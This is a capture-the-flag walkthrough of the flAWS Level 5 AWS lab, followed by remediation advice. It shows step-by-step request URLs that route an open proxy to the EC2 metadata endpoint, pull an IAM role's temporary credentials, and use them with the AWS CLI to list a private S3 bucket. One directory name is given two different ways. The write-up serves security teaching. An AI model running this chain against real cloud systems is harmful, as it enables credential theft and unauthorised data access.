# flAWS - Level 5

---

## Vulnerability Overview

This level demonstrates **SSRF (Server-Side Request Forgery)** chained with the **AWS Instance Metadata Service (IMDSv1)**.

The EC2 instance runs an open HTTP proxy — any URL you pass through it is fetched server-side. The attacker's insight: the AWS metadata endpoint `169.254.169.254` is a link-local address only reachable from within the EC2 instance. By routing requests through the proxy, an outsider can reach it as if they were the instance itself.

IMDSv1 requires no authentication. Once you reach the metadata endpoint, you can enumerate IAM role names and extract the temporary credentials the instance uses to call AWS APIs — including `AccessKeyId`, `SecretAccessKey`, and a session `Token`. These credentials can then be used to enumerate AWS resources in the account.

**IMDSv2** (the hardened version) requires a pre-flight `PUT` request to get a session token, which breaks simple SSRF pivoting. This level runs IMDSv1.

## Steps to Solve the Lab

**Step 1: Understanding the Proxy**

Navigate to the Level 5 challenge URL. The page explains that the EC2 instance runs an HTTP-only proxy. Example usage:

```
http://4d0cf09b9b2d761a7d87be99d1750bce8b86f3b.flaws.cloud/proxy/neverssl.com/
```

The challenge hint: *"See if you can use this proxy to list the contents of the level6 bucket."*

**Step 2: Testing the Proxy**

Access a public site through the proxy to confirm it works:

```
http://4d0cf09b9b2d761a7d87be99d1750bce8b86f3b.flaws.cloud/proxy/neverssl.com/
```

The proxy fetches the external site server-side and returns the response. This confirms we have arbitrary SSRF capability.

**Step 3: Pivoting to the AWS Metadata Service**

The AWS Instance Metadata Service runs on `169.254.169.254` — a link-local address normally unreachable from the internet. Route the request through the proxy:

```
http://4d0cf09b9b2d761a7d87be99d1750bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/
```

The response lists available metadata paths (`meta-data/`, `user-data`, `dynamic/`), confirming the SSRF pivot works.

**Step 4: Enumerating the Metadata Structure**

Browse the metadata categories:

```
http://4d0cf09b9b2d761a7d87be99d1750bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/
```

Response lists: `ami-id`, `hostname`, `iam/`, `instance-id`, `instance-type`, `local-ipv4`, `public-ipv4`, `security-groups`, and more.

**Step 5: Discovering the IAM Role**

Navigate to the IAM section:

```
http://4d0cf09b9b2d761a7d87be99d1750bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/
```

Response: `flaws` — the name of the IAM role attached to this instance.

**Step 6: Extracting Temporary Credentials**

Request the actual credentials for the role:

```
http://4d0cf09b9b2d761a7d87be99d1750bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws
```

The metadata service returns a JSON object:

```json
{
  "Code": "Success",
  "LastUpdated": "2026-01-11T14:22:55Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "<temporary-access-key-id>",
  "SecretAccessKey": "<temporary-secret-access-key>",
  "Token": "<session-token>",
  "Expiration": "2026-01-11T20:26:00Z"
}
```

> **CTF Note:** The actual credential values were visible in the browser response. These are temporary, short-lived IAM credentials generated by the flaws.cloud challenge infrastructure — they expire within hours and are scoped to the challenge account only.

**Step 7: Configuring AWS CLI with the Temporary Credentials**

Configure a new profile with the three credential components (key ID, secret key, and session token):

```bash
aws configure --profile flaws5
# AWS Access Key ID: <temporary-access-key-id>
# AWS Secret Access Key: <temporary-secret-access-key>

# Session token must be set separately (not available via aws configure):
aws configure set aws_session_token <session-token> --profile flaws5
```

**Step 8: Listing Level 6 Bucket Contents**

Use the compromised profile to enumerate the Level 6 bucket:

```bash
aws s3 ls s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud --profile flaws5
```

Output:

```
PRE ddcc78f1/
871 index.html  (2017-02-27 03:11:07)
```

The hidden directory `ddcc78ff/` is found — this is the path to Level 6.

## Key Takeaway

The SSRF → IMDS attack chain is one of the most impactful in cloud environments. An open proxy, a misconfigured metadata endpoint, and IMDSv1 combine into full credential compromise with no CVE and no exploitation — just correct URL construction.

The root causes here are:
1. **Open proxy** with no allowlist — any URL is accepted
2. **IMDSv1** — no session token required, no hop limit enforcement

## Remediation

- **Upgrade to IMDSv2**: Require a `PUT` token for all metadata requests — this breaks SSRF-based pivoting.
  ```bash
  aws ec2 modify-instance-metadata-options \
    --instance-id <id> --http-tokens required
  ```
- **Restrict proxy access**: If an HTTP proxy must exist, allowlist only specific destination hosts/IPs. Block `169.254.0.0/16` (link-local) at the proxy level.
- **Use IMDSv2 by default** on all new EC2 instances via the account-level setting.
- **Least privilege on IAM roles**: The `flaws` role had more permissions than the instance needed. Scope IAM roles to minimum required actions and resources.
